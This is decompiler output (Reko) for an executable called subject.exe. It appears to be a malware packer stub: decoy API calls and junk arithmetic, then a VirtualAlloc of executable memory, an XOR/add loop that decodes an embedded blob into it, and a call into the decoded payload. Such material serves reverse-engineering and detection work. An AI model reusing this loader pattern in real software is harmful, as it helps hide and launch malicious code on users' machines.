// subject.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

// 004012F8: Register Eq_2 Win32CrtStartup()
Eq_2 Win32CrtStartup()
{
	CharUpperA(fp - 0x98);
	OpenEventW(0x00, 0x00, fp - 188);
	GetDC(0x00);
	Eq_30 ecx_36 = fp - 188;
	if (GetCurrentThreadId() == 0x026D)
		ecx_36 = fp - 188 ^ dwArg05;
	word32 esp_76;
	word32 ebp_77;
	byte SCZO_78;
	word32 eax_79;
	byte Z_80;
	word32 edx_81;
	byte SZO_82;
	byte C_83;
	word32 ecx_84;
	Eq_2 ebx_85;
	Eq_2 esi_86;
	Eq_2 edi_87;
	_set_app_type();
	GetFileAttributesA(fp - 0xB4);
	CharUpperA(fp - 232);
	GetProcessHeap();
	IsWindow(OpenMutexA(CharUpperA(fp - 0xA8) & 0x08, 0x00, fp - 0x9C) - dwArg00);
	Eq_2 ecx_132 = (fp - 0xA8 & 0x011C) - dwArg01;
	Eq_97 v22_138 = dwLoc0120 - (fp - 0x04);
	Eq_2 edx_140 = fp - 0x04 ^ 0x0611;
	if ((GetCurrentThreadId() & 2788) != ecx_132)
	{
		edx_140 = edx_140 | ecx_132;
		dwLocB8 = dwLocB8 + (ecx_132 | dwLoc0140);
		ecx_132 = fp - 0x04;
	}
	*(fp - 0x026C) = fp - 0x04;
	*(fp - 0x026C) = *(fp - 0x026C) - 0x5C;
	(fp - 0x0270)->u0 = 0x00;
	Eq_2 eax_168 = GetClientRect(*(fp - 0x0270), *(fp - 0x026C)) | dwLoc0180;
	if (eax_168 != edx_140)
	{
		eax_168 = fp - 0x0228;
		edx_140 = (edx_140 ^ dwLoc0225 ^ dwLoc021C) & dwLoc0227;
	}
	(fp - 0x026C)->u0 = 0x00;
	Eq_2 edx_181 = edx_140 ^ 0x21CD;
	Eq_166 C_185 = cond(eax_168 - edx_181);
	if (eax_168 != edx_181)
	{
		eax_168 = eax_168 - 13345;
		edx_181 = (word32) (edx_181 * 0x02) + (eax_168 < edx_181);
		ecx_132 = ecx_132 + v22_138;
		C_185 = cond(eax_168);
	}
	(fp - 0x0270)->u0 = 0x00;
	if (eax_168 + edx_181 + C_185 == 0x0330)
	{
		edx_181 = edx_181 ^ 7664;
		ecx_132 = ecx_132 - 0x292F;
	}
	(fp - 0x0274)->u0 = 0x00;
	Eq_202 eax_210 = CreateItemMoniker(*(fp - 0x0274), *(fp - 0x0270), *(fp - 0x026C));
	ui32 eax_212 = eax_210 ^ 0x80070057;
	if ((eax_210 ^ 0x80070057) == 0x00)
	{
		Eq_2 eax_262 = (word32) edx_181 + (eax_210 ^ 0x80070057);
		if (eax_262 == 0x00)
		{
			edx_181 = fp - 200;
			eax_262 = eax_262 - dwLocB8;
			ecx_132 = (ecx_132 & dwLocBD) - dwLocC3;
		}
		*(fp - 0x026C) = eax_262;
		*(fp - 0x0270) = ecx_132;
		*(fp - 0x0274) = edx_181;
		*(fp - 0x0278) = ebx_85;
		*(fp - 636) = fp - 616;
		*(fp - 0x0280) = fp - 0x04;
		*(fp - 644) = esi_86;
		*(fp - 0x0288) = edi_87;
		(fp - 0x028C)->u0 = 0x40;
		Eq_287 ecx_297 = (ecx_132 & 0x2F37) + dwLoc03;
		if (fp - 0x04 != ecx_297)
			ecx_297 = fp - 484;
		(fp - 656)->u0 = 0x1000;
		(fp - 660)->u0 = 0x2000;
		(fp - 664)->u0 = 0x00;
		Eq_2 eax_329 = VirtualAlloc(*(fp - 664), *(fp - 660), *(fp - 656), *(fp - 0x028C));
		if (dwLoc0154 == ecx_297)
			ecx_297 = (word32) ecx_297 + 0x00001D56 ^ 10339;
		Eq_352 eax_355 = (fp - 0x04 ^ dwLoc010E) + dwLoc0118;
		ui32 ecx_358 = (word32) eax_355 + (ecx_297 - dwLoc01B4 | dwArg0B);
		struct Eq_364 * edi_357 = &globals->t412E33;
		Eq_2 esi_359 = eax_329;
		Eq_367 edx_362 = fp - 9409;
		word32 dwLoc68_363 = 2742709975;
		Eq_372 ecx_364 = ecx_358 - 0x28C3;
		if (ecx_358 != 0x28C3)
			ecx_364 = ecx_358 - 0x28C3 | 0x28C3;
		do
		{
			word32 ebx_383 = edi_357->dw0000 + dwLoc68_363;
			*esi_359 = ebx_383;
			dwLoc68_363 = dwLoc68_363 + 1648285686;
			Eq_391 edx_388 = edx_362 - eax_355;
			eax_355 = eax_355 | 0x2279;
			ptr32 edi_392 = (char *) edi_357 - 80554824;
			ecx_364 = ((ecx_364 ^ dwLoc4C) & edx_362) - dwLoc8C;
			word32 esi_396 = esi_359 + 0xA596E2A8;
			if (eax_355 == 1007)
			{
				edx_388 = fp - 388 - ecx_364;
				eax_355 = (eax_355 | 0x38A7) & 0x3565;
			}
			edi_357 = edi_392 + 80554828;
			edx_362 = (word32) edx_388 + 0x00003BBE;
			esi_359 = esi_396 + 1516838236;
			if ((dwLoc0234 & ecx_364) != 0x00)
				eax_355 = eax_355 ^ 0x34ED;
		} while (edi_392 != 76278925);
		word32 esp_421;
		word32 ebp_422;
		byte SCZO_423;
		byte Z_425;
		ui32 edx_426;
		byte SZO_427;
		byte C_428;
		word32 ecx_429;
		word32 ebx_430;
		word32 esi_431;
		word32 edi_432;
		eax_329();
		if (eax_212 == edx_426)
			eax_212 = eax_212 & 0x30B6;
	}
	return eax_212;
}

